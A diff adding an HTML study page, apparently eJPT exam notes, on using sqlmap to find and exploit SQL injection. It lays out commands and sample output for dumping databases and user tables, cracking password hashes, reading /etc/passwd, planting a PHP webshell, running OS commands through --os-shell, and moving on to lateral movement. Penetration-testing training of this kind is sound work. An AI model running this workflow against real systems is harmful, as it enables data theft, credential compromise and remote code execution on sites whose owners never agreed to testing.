@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>02_sqlmap.md</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            color: #2c3e50;
+            margin-top: 24px;
+            margin-bottom: 16px;
+        }
+        h1 { border-bottom: 2px solid #0066cc; padding-bottom: 10px; }
+        code {
+            background: #f4f4f4;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            color: #c7254e;
+        }
+        pre {
+            background: #f5f5f5;
+            color: #333;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            line-height: 1.4;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+        }
+        pre code {
+            background: transparent;
+            color: #333;
+            padding: 0;
+        }
+        .codehilite {
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 0;
+            margin: 15px 0;
+        }
+        .codehilite pre {
+            margin: 0;
+            border: none;
+            background: #f5f5f5;
+            padding: 15px;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 15px 0;
+        }
+        table th, table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        table th {
+            background-color: #f2f2f2;
+            font-weight: bold;
+        }
+        blockquote {
+            border-left: 4px solid #0066cc;
+            margin: 15px 0;
+            padding-left: 15px;
+            color: #666;
+        }
+        a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        @media print {
+            body { margin: 0; padding: 10px; }
+            pre { page-break-inside: avoid; }
+            table { page-break-inside: avoid; }
+        }
+    </style>
+    <!-- Anime Vibes CSS Framework -->
+    <link rel="stylesheet" href="anime-vibes.css">
+    </head>
+<body>
+    <h1 id="sqlmap-sql-injection-automation">SQLMAP - SQL Injection Automation</h1>
+
+<h2 id="overview">Overview</h2>
+
+<p><strong>sqlmap</strong> is an automated tool for detecting and exploiting SQL injection vulnerabilities. It automatically tests parameters for SQL injection, identifies databases, and can extract data or execute commands.</p>
+
+<h3 id="why-its-critical-for-ejpt">Why It's Critical for eJPT:</h3>
+
+<ul>
+<li>SQL injection is extremely common in web apps</li>
+<li>Automates tedious manual testing</li>
+<li>Can extract entire databases</li>
+<li>Can read/write files on server</li>
+<li>Can execute system commands (in some cases)</li>
+<li>Works with GET, POST, COOKIE, HEADER parameters</li>
+</ul>
+
+<hr />
+
+<h2 id="installation-setup">Installation &amp; Setup</h2>
+
+<h3 id="cachyos-arch-linux">CachyOS (Arch Linux)</h3>
+
+<div class="codehilite">
+<pre><span></span><code>sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>sqlmap
+sqlmap<span class="w"> </span>--version<span class="w">  </span><span class="c1"># Verify</span>
+which<span class="w"> </span>sqlmap
+</code></pre>
+</div>
+
+<h3 id="windows">Windows</h3>
+
+<ul>
+<li>Download from: https://github.com/sqlmapproject/sqlmap</li>
+<li>Requires Python (usually included)</li>
+<li>Run: <code>python sqlmap.py</code></li>
+</ul>
+
+<hr />
+
+<h2 id="core-concepts">Core Concepts</h2>
+
+<h3 id="sql-injection-types">SQL Injection Types</h3>
+
+<ul>
+<li><strong>Boolean-based blind</strong>: True/False responses</li>
+<li><strong>Time-based blind</strong>: Response time differences</li>
+<li><strong>Error-based</strong>: Database error messages reveal data</li>
+<li><strong>UNION-based</strong>: Attach UNION SELECT statements</li>
+<li><strong>Stacked queries</strong>: Execute multiple queries</li>
+</ul>
+
+<h3 id="parameter-types">Parameter Types</h3>
+
+<ul>
+<li><strong>GET</strong>: URL parameters (<code>?id=1</code>)</li>
+<li><strong>POST</strong>: Form data</li>
+<li><strong>COOKIE</strong>: Session cookies</li>
+<li><strong>HEADER</strong>: Custom headers</li>
+</ul>
+
+<h3 id="database-targets">Database Targets</h3>
+
+<ul>
+<li>MySQL / MariaDB</li>
+<li>PostgreSQL</li>
+<li>MSSQL</li>
+<li>SQLite</li>
+<li>Oracle</li>
+<li>Others...</li>
+</ul>
+
+<hr />
+
+<h2 id="common-use-cases">Common Use Cases</h2>
+
+<h3 id="1-basic-url-testing">1. <strong>Basic URL Testing</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span>
+</code></pre>
+</div>
+
+<p><strong>Flags:</strong>
+- <code>-u</code>: Target URL</p>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>[*] Testing GET parameter 'id'
+[CRITICAL] parameter 'id' appears to be vulnerable to SQL injection attacks
+
+[*] Attempting break-out from quoted context
+[*] Trying UNION SELECT injection
+
+[+] Parameter: id (GET)
+    Type: UNION query-based
+    Title: Generic UNION query SQL injection
+    Payload: 1' UNION SELECT NULL,NULL,NULL--
+
+[*] Fetched data:
+[*] Database: wordpress
+[*] User: root@localhost
+</code></pre>
+
+<h3 id="2-list-databases">2. <strong>List Databases</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>--dbs
+</code></pre>
+</div>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] wordpress
+</code></pre>
+
+<h3 id="3-list-tables-in-database">3. <strong>List Tables in Database</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>wordpress<span class="w"> </span>--tables
+</code></pre>
+</div>
+
+<p><strong>Flags:</strong>
+- <code>-D</code>: Database name
+- <code>--tables</code>: List tables</p>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>Database: wordpress
+[15 tables]
++------------------+
+| wp_commentmeta   |
+| wp_comments      |
+| wp_links         |
+| wp_options       |
+| wp_postmeta      |
+| wp_posts         |
+| wp_term_taxonomy |
+| wp_terms         |
+| wp_users         |
++------------------+
+</code></pre>
+
+<h3 id="4-dump-specific-table">4. <strong>Dump Specific Table</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>wordpress<span class="w"> </span>-T<span class="w"> </span>wp_users<span class="w"> </span>--dump
+</code></pre>
+</div>
+
+<p><strong>Flags:</strong>
+- <code>-T</code>: Table name
+- <code>--dump</code>: Extract data</p>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>Database: wordpress
+Table: wp_users
+[2 entries]
++----+----------+------+-------+
+| ID | user_login | user_pass | user_email |
++----+----------+------+-------+
+| 1  | admin    | [hash] | admin@site.com |
+| 2  | user1    | [hash] | user1@site.com |
++----+----------+------+-------+
+</code></pre>
+
+<h3 id="5-crack-password-hashes">5. <strong>Crack Password Hashes</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>wordpress<span class="w"> </span>-T<span class="w"> </span>wp_users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dump<span class="w"> </span>--threads<span class="w"> </span><span class="m">5</span><span class="w"> </span>--passwords
+</code></pre>
+</div>
+
+<h3 id="6-post-parameter-testing">6. <strong>POST Parameter Testing</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/login&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;username=admin&amp;password=pass&quot;</span>
+</code></pre>
+</div>
+
+<p><strong>Flags:</strong>
+- <code>--data</code>: POST data to test</p>
+
+<h3 id="7-cookie-testing">7. <strong>Cookie Testing</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=abc123; user=1&quot;</span>
+</code></pre>
+</div>
+
+<h3 id="8-test-specific-parameter">8. <strong>Test Specific Parameter</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/search?q=test&amp;page=1&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;q&quot;</span>
+</code></pre>
+</div>
+
+<p><strong>Flags:</strong>
+- <code>-p</code>: Specify parameter to test</p>
+
+<h3 id="9-read-files">9. <strong>Read Files</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>--file-read<span class="o">=</span>/etc/passwd
+</code></pre>
+</div>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>[*] Reading /etc/passwd file:
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+</code></pre>
+
+<h3 id="10-write-files-webshell">10. <strong>Write Files (Webshell)</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>--file-write<span class="o">=</span>shell.php<span class="w"> </span>--file-dest<span class="o">=</span>/var/www/html/shell.php
+</code></pre>
+</div>
+
+<h3 id="11-execute-os-commands">11. <strong>Execute OS Commands</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>--os-shell
+</code></pre>
+</div>
+
+<h3 id="12-authentication">12. <strong>Authentication</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/admin?id=1&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--auth-type<span class="o">=</span>Basic<span class="w"> </span>--auth-cred<span class="o">=</span><span class="s2">&quot;admin:password&quot;</span>
+</code></pre>
+</div>
+
+<h3 id="13-proxy-through-burp">13. <strong>Proxy Through Burp</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--proxy<span class="o">=</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span>
+</code></pre>
+</div>
+
+<h3 id="14-use-saved-burp-request">14. <strong>Use Saved Burp Request</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-r<span class="w"> </span>request.txt
+</code></pre>
+</div>
+
+<p><strong>Flags:</strong>
+- <code>-r</code>: Read HTTP request from file</p>
+
+<h3 id="15-risk-level">15. <strong>Risk &amp; Level</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span>
+</code></pre>
+</div>
+
+<p><strong>Flags:</strong>
+- <code>--risk</code>: 1-3 (conservative to aggressive)
+- <code>--level</code>: 1-5 (basic to thorough)</p>
+
+<hr />
+
+<h2 id="practical-ejpt-workflow">Practical eJPT Workflow</h2>
+
+<h3 id="complete-sql-injection-exploitation">Complete SQL Injection Exploitation</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Step 1: Identify vulnerable parameter</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/product?id=1&quot;</span><span class="w"> </span>-v<span class="w"> </span><span class="m">1</span>
+
+<span class="c1"># Step 2: If vulnerable, list databases</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/product?id=1&quot;</span><span class="w"> </span>--dbs
+
+<span class="c1"># Step 3: List tables in target database</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/product?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>--tables
+
+<span class="c1"># Step 4: Dump tables with data</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/product?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
+
+<span class="c1"># Step 5: Crack password hashes</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/product?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dump<span class="w"> </span>--passwords
+
+<span class="c1"># Step 6: Try file read</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/product?id=1&quot;</span><span class="w"> </span>--file-read<span class="o">=</span>/etc/passwd
+
+<span class="c1"># Step 7: Try webshell upload</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/product?id=1&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--file-write<span class="o">=</span>/tmp/shell.php<span class="w"> </span>--file-dest<span class="o">=</span>/var/www/html/shell.php
+
+<span class="c1"># Step 8: Access shell</span>
+curl<span class="w"> </span>http://target.com/shell.php?cmd<span class="o">=</span>id
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="real-world-example">Real-World Example</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Scenario: eJPT lab with vulnerable search page</span>
+
+$<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span>-sV
+<span class="c1"># Result: Apache 2.4.6 on port 80</span>
+
+$<span class="w"> </span>firefox<span class="w"> </span>http://192.168.1.50
+<span class="c1"># Find search form with parameter: ?search=test</span>
+
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.50/search?search=test&quot;</span><span class="w"> </span>--dbs
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Testing<span class="w"> </span>GET<span class="w"> </span>parameter<span class="w"> </span><span class="s1">&#39;search&#39;</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Vulnerable<span class="w"> </span>to<span class="w"> </span>SQL<span class="w"> </span>injection!
+
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.50/search?search=test&quot;</span><span class="w"> </span>-D<span class="w"> </span>mysql<span class="w"> </span>--tables
+<span class="c1"># Shows: user, password_history, etc.</span>
+
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.50/search?search=test&quot;</span><span class="w"> </span>-D<span class="w"> </span>mysql<span class="w"> </span>-T<span class="w"> </span>user<span class="w"> </span>--dump
+<span class="c1"># Extracts admin:password_hash</span>
+
+$<span class="w"> </span>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>hashes.txt
+<span class="c1"># Cracks password to: &quot;password123&quot;</span>
+
+<span class="c1"># Now use credentials to login or escalate</span>
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="command-reference">Command Reference</h2>
+
+<table>
+<thead>
+<tr>
+  <th>Flag</th>
+  <th>Purpose</th>
+  <th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td><code>-u</code></td>
+  <td>Target URL</td>
+  <td><code>-u "http://target.com/page?id=1"</code></td>
+</tr>
+<tr>
+  <td><code>--dbs</code></td>
+  <td>List databases</td>
+  <td>Enumerate available databases</td>
+</tr>
+<tr>
+  <td><code>-D</code></td>
+  <td>Database</td>
+  <td><code>-D wordpress</code></td>
+</tr>
+<tr>
+  <td><code>--tables</code></td>
+  <td>List tables</td>
+  <td>Show tables in database</td>
+</tr>
+<tr>
+  <td><code>-T</code></td>
+  <td>Table</td>
+  <td><code>-T wp_users</code></td>
+</tr>
+<tr>
+  <td><code>--dump</code></td>
+  <td>Extract data</td>
+  <td>Dump table contents</td>
+</tr>
+<tr>
+  <td><code>--data</code></td>
+  <td>POST data</td>
+  <td><code>--data="user=admin&amp;pass=pass"</code></td>
+</tr>
+<tr>
+  <td><code>-p</code></td>
+  <td>Parameter</td>
+  <td><code>-p "id"</code> (specific parameter)</td>
+</tr>
+<tr>
+  <td><code>--file-read</code></td>
+  <td>Read file</td>
+  <td><code>--file-read=/etc/passwd</code></td>
+</tr>
+<tr>
+  <td><code>--file-write</code></td>
+  <td>Write file</td>
+  <td><code>--file-write=shell.php</code></td>
+</tr>
+<tr>
+  <td><code>-x</code></td>
+  <td>Execute command</td>
+  <td><code>-x "whoami"</code></td>
+</tr>
+<tr>
+  <td><code>--os-shell</code></td>
+  <td>Interactive shell</td>
+  <td>Spawn command shell</td>
+</tr>
+<tr>
+  <td><code>--risk</code></td>
+  <td>Aggressiveness</td>
+  <td>1-3 (default 1)</td>
+</tr>
+<tr>
+  <td><code>--level</code></td>
+  <td>Depth</td>
+  <td>1-5 (default 1)</td>
+</tr>
+<tr>
+  <td><code>-r</code></td>
+  <td>From file</td>
+  <td><code>-r request.txt</code></td>
+</tr>
+<tr>
+  <td><code>-v</code></td>
+  <td>Verbosity</td>
+  <td>-v 0-6 (default 1)</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2 id="tips-tricks">Tips &amp; Tricks</h2>
+
+<h3 id="quick-exploitation">Quick Exploitation</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Start basic:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>-v<span class="w"> </span><span class="m">1</span>
+
+<span class="c1"># If not found, increase level/risk:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span>
+
+<span class="c1"># If still not found, try different technique:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--technique<span class="o">=</span>T<span class="w">  </span><span class="c1"># Time-based</span>
+
+<span class="c1"># Get everything from database:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--dump-all
+
+<span class="c1"># Try blind injection on POST:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/login&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;u=admin&amp;p=pass&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span>
+</code></pre>
+</div>
+
+<h3 id="performance">Performance</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Fast (basic tests):</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">1</span>
+
+<span class="c1"># Thorough (takes longer):</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span>
+
+<span class="c1"># Very fast (risky):</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--technique<span class="o">=</span>E<span class="w">  </span><span class="c1"># Error-based only</span>
+</code></pre>
+</div>
+
+<h3 id="common-findings">Common Findings</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Finding</th>
+  <th>Implication</th>
+  <th>Action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Vulnerable parameter</td>
+  <td>Direct database access</td>
+  <td>Dump all data</td>
+</tr>
+<tr>
+  <td>No database access</td>
+  <td>Limited exploitation</td>
+  <td>Read files / RCE</td>
+</tr>
+<tr>
+  <td>File read works</td>
+  <td>Read configs</td>
+  <td>Look for credentials/paths</td>
+</tr>
+<tr>
+  <td>File write works</td>
+  <td>RCE possible</td>
+  <td>Upload webshell</td>
+</tr>
+<tr>
+  <td>User table found</td>
+  <td>Credentials available</td>
+  <td>Crack hashes</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2 id="combining-tools">Combining Tools</h2>
+
+<h3 id="sqlmap-john-password-cracking">sqlmap → john (Password Cracking)</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Extract hashes:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>mysql<span class="w"> </span>-T<span class="w"> </span>user<span class="w"> </span>--dump<span class="w"> </span>&gt;<span class="w"> </span>hashes.txt
+
+<span class="c1"># Crack with john:</span>
+john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>hashes.txt
+</code></pre>
+</div>
+
+<h3 id="gobuster-sqlmap-workflow">Gobuster → sqlmap (Workflow)</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Find pages with gobuster:</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+
+<span class="c1"># Test each for SQL injection with sqlmap:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page1?id=1&quot;</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page2?id=1&quot;</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/admin?id=1&quot;</span>
+</code></pre>
+</div>
+
+<h3 id="burp-suite-sqlmap">Burp Suite → sqlmap</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Intercept request in Burp</span>
+<span class="c1"># Copy request to file</span>
+<span class="c1"># Test with sqlmap:</span>
+sqlmap<span class="w"> </span>-r<span class="w"> </span>request.txt<span class="w"> </span>--dbs
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="troubleshooting">Troubleshooting</h2>
+
+<table>
+<thead>
+<tr>
+  <th>Problem</th>
+  <th>Solution</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>"No parameter to test"</td>
+  <td>Specify with <code>-p</code> or use <code>--data</code></td>
+</tr>
+<tr>
+  <td>"Target URL seems down"</td>
+  <td>Check connectivity with curl first</td>
+</tr>
+<tr>
+  <td>"No injectable parameter"</td>
+  <td>Not all parameters are vulnerable</td>
+</tr>
+<tr>
+  <td>"False positive"</td>
+  <td>Use <code>-p</code> to test specific parameter only</td>
+</tr>
+<tr>
+  <td>"Timeout"</td>
+  <td>Use <code>--timeout=30</code> or reduce <code>--threads</code></td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2 id="official-documentation-resources">Official Documentation &amp; Resources</h2>
+
+<ul>
+<li><strong>GitHub</strong>: https://github.com/sqlmapproject/sqlmap</li>
+<li><strong>Documentation</strong>: https://github.com/sqlmapproject/sqlmap/wiki</li>
+<li><strong>Usage Guide</strong>: <code>sqlmap -h</code></li>
+<li><strong>SQL Injection Info</strong>: https://owasp.org/www-community/attacks/SQL_Injection</li>
+</ul>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<ol>
+<li><strong>Basic test</strong>: <code>sqlmap -u "http://target?id=1"</code></li>
+<li><strong>Extract databases</strong>: <code>--dbs</code></li>
+<li><strong>Extract tables</strong>: <code>-D db --tables</code></li>
+<li><strong>Extract data</strong>: <code>-D db -T table --dump</code></li>
+<li><strong>Crack hashes</strong>: <code>--passwords</code> or use john</li>
+<li><strong>Read files</strong>: <code>--file-read=/path/file</code></li>
+<li><strong>Write shells</strong>: <code>--file-write=shell.php</code></li>
+<li><strong>Execute commands</strong>: <code>--os-shell</code></li>
+<li><strong>Adjust testing</strong>: <code>--level=5 --risk=3</code> for thorough</li>
+<li><strong>Combine with other tools</strong>: Gobuster finds pages, sqlmap tests them</li>
+</ol>
+
+<hr />
+
+<p><strong>Next Steps</strong>: Use extracted data and credentials for privilege escalation or lateral movement.</p>
+
+</body>
+</html>
